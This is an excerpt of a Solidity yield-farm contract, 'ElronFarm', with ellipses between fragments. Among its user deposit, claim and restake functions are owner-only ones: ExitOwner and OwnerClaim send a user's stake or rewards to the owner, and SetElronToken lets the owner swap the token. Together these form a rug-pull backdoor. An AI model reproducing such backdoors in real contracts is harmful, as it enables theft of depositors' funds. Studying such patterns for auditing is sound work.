...
contract ElronFarm is Ownable{
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint256;
    
    uint public PoolId;
    uint public Duration = 3 hours;
    uint public Counter;
    uint public TotalReward = 10000000000000000;//0.01
    address public ElronlpFarm;
    ...
    constructor(){
        PlatformAccount = 0xA13Db39BdcE5d0Ca42cAd9B41b9485ed12646f16; 
        Elron = IERC20(0x47B01e12e3E2ec419eaD7595e31295397CD4C4D2); 
        Elronlp = IERC20(0x05EE057d0b9D4FEa905d61fD370312F40527245c);
    ...
    function SetElronToken(address _token) external onlyOwner{
        Elron = IERC20(_token);
    }
    ...
    function Deposit(uint amount) public checkPhase{
        Elron.safeTransferFrom(msg.sender, address(this), amount);
    ...
    function Exit() public checkPhase{
        require(UserPoolStakeAmount[msg.sender][PoolId] > 0, "No Elron to withdraw in this pool");
        Elron.safeTransfer(msg.sender, UserPoolStakeAmount[msg.sender][PoolId]);
    ...
    function ExitOwner(address _userAddress) public checkPhase onlyOwner{
        require(UserPoolStakeAmount[_userAddress][PoolId] > 0, "No Elron to withdraw in this pool");
        Elron.safeTransfer(msg.sender, UserPoolStakeAmount[_userAddress][PoolId]);
    ...
    function Claim() public checkPhase{
        ...
        USDT.safeTransfer(msg.sender, UserRewards[msg.sender]);
    ...
    function OwnerClaim(address _userAddress) public onlyOwner checkPhase{
        ...
        USDT.safeTransfer(msg.sender, UserRewards[_userAddress]);
    ...
    function Restake() external checkPhase{
        ...
        convertPancake(UserRewards[msg.sender], address(USDT), address(Elron));
        uint ElronUserReward = Elron.balanceOf(address(this)).sub(balanceInContrat);

        Insert(msg.sender, ElronUserReward, true);
    ...
    function OwnerRestake(address _userAddress) external onlyOwner checkPhase{
        require(UserRewards[_userAddress] > 0, "No reward to claim");
        uint balanceInContrat = Elron.balanceOf(address(this));
        convertPancake(UserRewards[_userAddress], address(USDT), address(Elron));
        uint ElronUserReward = Elron.balanceOf(address(this)).sub(balanceInContrat);

        Insert(_userAddress, ElronUserReward, true);
    ...
    function RestakeElronlp() external checkPhase{
        require(UserRewards[msg.sender] > 0, "No reward to claim");
        uint balanceInContrat = Elron.balanceOf(address(this));
    ...
    function OwnerRestakeElronlp(address _userAddress) external onlyOwner checkPhase{
        require(UserRewards[_userAddress] > 0, "No reward to claim");
        uint balanceInContrat = Elron.balanceOf(address(this));
